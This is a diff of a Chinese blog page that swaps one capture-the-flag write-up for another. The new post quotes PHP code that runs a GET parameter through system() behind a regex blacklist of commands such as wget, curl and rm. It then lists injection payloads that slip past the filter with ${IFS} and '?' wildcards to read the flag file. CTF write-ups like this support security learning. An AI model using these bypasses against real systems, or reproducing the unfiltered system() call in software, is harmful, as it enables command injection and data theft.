@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="www.zip,源码压缩包泄露," />
+  <meta name="keywords" content="过滤*," />
 
 
 
@@ -79,21 +79,18 @@
 
 
 
-<meta name="description" content="题目描述：解压源码到当前目录，测试正常，收工  访问&#x2F;www.zip：  下载并解压压缩包，得到下图两个  打开fl000g.txt 里面的是假flag  需要访问&#x2F;fl000g.txt即可。  解释：www.zip是源码包，可以下载。下载后发现其中有fl000g.txt，说明网站中有这个文件。但下载的fl000g.txt中的内容并不一定是网站中fl000g.txt的内容，这是为了可供下载者自行修">
+<meta name="description" content="if(isset($_GET[‘c’])){      $c&#x3D;$_GET[‘c’];      if(!preg_match(“&#x2F;;|.*c.*a.t.|.*f.*l.*a.g.| |[0-9]|*|.*m.*o.*r.e.|.*w.*g.*e.t.|.*l.*e.*s.s.|.*h.*e.*a.d.|.*s.*o.*r.t.|.*t.*a.*i.l.|.*s.*e.d.|.*c.*u.t.|.*">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow-web6">
-<meta property="og:url" content="http://example.com/2021/12/28/ctfshow-web6/index.html">
+<meta property="og:title" content="ctfshow-54">
+<meta property="og:url" content="http://example.com/2022/01/10/ctfshow-54/index.html">
 <meta property="og:site_name" content="web地板成长之路">
-<meta property="og:description" content="题目描述：解压源码到当前目录，测试正常，收工  访问&#x2F;www.zip：  下载并解压压缩包，得到下图两个  打开fl000g.txt 里面的是假flag  需要访问&#x2F;fl000g.txt即可。  解释：www.zip是源码包，可以下载。下载后发现其中有fl000g.txt，说明网站中有这个文件。但下载的fl000g.txt中的内容并不一定是网站中fl000g.txt的内容，这是为了可供下载者自行修">
+<meta property="og:description" content="if(isset($_GET[‘c’])){      $c&#x3D;$_GET[‘c’];      if(!preg_match(“&#x2F;;|.*c.*a.t.|.*f.*l.*a.g.| |[0-9]|*|.*m.*o.*r.e.|.*w.*g.*e.t.|.*l.*e.*s.s.|.*h.*e.*a.d.|.*s.*o.*r.t.|.*t.*a.*i.l.|.*s.*e.d.|.*c.*u.t.|.*">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/12/28/ctfshow-web6/66.png">
-<meta property="article:published_time" content="2021-12-28T09:55:01.000Z">
-<meta property="article:modified_time" content="2021-12-28T09:59:49.405Z">
+<meta property="article:published_time" content="2022-01-10T09:40:22.000Z">
+<meta property="article:modified_time" content="2022-01-10T09:46:11.157Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="www.zip">
-<meta property="article:tag" content="源码压缩包泄露">
+<meta property="article:tag" content="过滤*">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/12/28/ctfshow-web6/66.png">
 
 
 
@@ -123,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2021/12/28/ctfshow-web6/"/>
+  <link rel="canonical" href="http://example.com/2022/01/10/ctfshow-54/"/>
 
 
 
 
 
-  <title>ctfshow-web6 | web地板成长之路</title>
+  <title>ctfshow-54 | web地板成长之路</title>
   
 
 
@@ -266,7 +263,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/28/ctfshow-web6/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/ctfshow-54/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -283,7 +280,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ctfshow-web6</h1>
+          <h1 class="post-title" itemprop="name headline">ctfshow-54</h1>
         
 
         <div class="post-meta">
@@ -295,8 +292,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-12-28T17:55:01+08:00">
-                2021-12-28
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-01-10T17:40:22+08:00">
+                2022-01-10
               </time>
             
 
@@ -355,14 +352,24 @@
       
 
       
-        <p>题目描述：解压源码到当前目录，测试正常，收工 </p>
-<p>访问<code>/www.zip</code>： </p>
-<p>下载并解压压缩包，得到下图两个</p>
-<p><img src="/2021/12/28/ctfshow-web6/66.png" alt="66"></p>
-<p>打开fl000g.txt</p>
-<p>里面的是假flag </p>
-<p>需要访问<code>/fl000g.txt</code>即可。 </p>
-<p>解释：<code>www.zip</code>是源码包，可以下载。下载后发现其中有<code>fl000g.txt</code>，说明网站中有这个文件。但下载的<code>fl000g.txt</code>中的内容并不一定是网站中<code>fl000g.txt</code>的内容，这是为了可供下载者自行修改该文件，也就是下载者只通过源码包了解大概的源码框架，细节部分可自行修改。这个涉及到开发方面的问题。</p>
+        <p>if(isset($_GET[‘c’])){   </p>
+<p>  $c=$_GET[‘c’];     </p>
+<p>if(!preg_match(“/;|.*c.*a.<em>t.</em>|.*f.*l.*a.<em>g.</em>| |[0-9]|*|.*m.*o.*r.<em>e.</em>|.*w.*g.*e.<em>t.</em>|.*l.*e.*s.<em>s.</em>|.*h.*e.*a.<em>d.</em>|.*s.*o.*r.<em>t.</em>|.*t.*a.*i.<em>l.</em>|.*s.*e.<em>d.</em>|.*c.*u.<em>t.</em>|.*t.*a.<em>c.</em>|.*a.*w.<em>k.</em>|.*s.*t.*r.*i.*n.*g.<em>s.</em>|.*o.<em>d.</em>|.*c.*u.*r.<em>l.</em>|.*n.<em>l.</em>|.*s.*c.<em>p.</em>|.*r.<em>m.</em>|`|%|\x09|\x26|&gt;|&lt;/i”, $c)){        </p>
+<p> system($c);     } </p>
+<p>}else{     </p>
+<p>highlight_file(<strong>FILE</strong>); </p>
+<p>} </p>
+<p>1.可以用paste查看文件内容</p>
+<p>payload：?c=paste${IFS}fla?.php</p>
+<p>2.可以用通匹符表示命令，但是通匹符不会帮你找/bin/下面的cat，而会找当前目录下匹配?at的文件，所以用通匹符代表命令的时候要给出路径 </p>
+<p>payload：?c=/bin/?at${IFS}fla?.php</p>
+<ol start="3">
+<li>使用vi,*用多个?代替即可</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=vi$&#123;IFS&#125;f???.???</span><br></pre></td></tr></table></figure>
+
+<p><code>c=/bin/c??$&#123;IFS&#125;????????</code> </p>
+<p><code>c=/bin/c??$IFS????????</code> </p>
 
       
     </div>
@@ -380,9 +387,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/www-zip/" rel="tag"># www.zip</a>
-          
-            <a href="/tags/%E6%BA%90%E7%A0%81%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%B3%84%E9%9C%B2/" rel="tag"># 源码压缩包泄露</a>
+            <a href="/tags/%E8%BF%87%E6%BB%A4/" rel="tag"># 过滤*</a>
           
         </div>
       
@@ -395,8 +400,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2021/12/28/robots%E5%8D%8F%E8%AE%AE/" rel="next" title="robots协议">
-                <i class="fa fa-chevron-left"></i> robots协议
+              <a href="/2022/01/05/ctfshow-web42/" rel="next" title="ctfshow-web42">
+                <i class="fa fa-chevron-left"></i> ctfshow-web42
               </a>
             
           </div>
@@ -404,10 +409,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/12/29/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" rel="prev" title="hexo博客搭建">
-                hexo博客搭建 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
